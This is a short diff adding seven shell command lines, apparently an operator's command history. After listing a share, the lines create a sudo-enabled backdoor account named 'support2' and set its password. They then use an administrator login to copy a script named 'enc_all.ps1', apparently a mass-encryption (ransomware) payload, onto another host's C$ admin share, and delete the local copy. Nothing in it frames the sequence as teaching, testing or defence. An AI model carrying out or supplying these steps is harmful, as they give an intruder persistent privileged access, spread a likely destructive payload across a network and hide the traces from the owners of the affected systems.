@@ -1,0 +1,7 @@
+ls -la /srv/partage
+useradd -m -s /bin/bash support2
+usermod -aG sudo support2
+passwd support2
+smbclient //10.0.0.20/c$ -U administrateur -c 'put enc_all.ps1 Users\Public\enc_all.ps1'
+rm enc_all.ps1
+exit
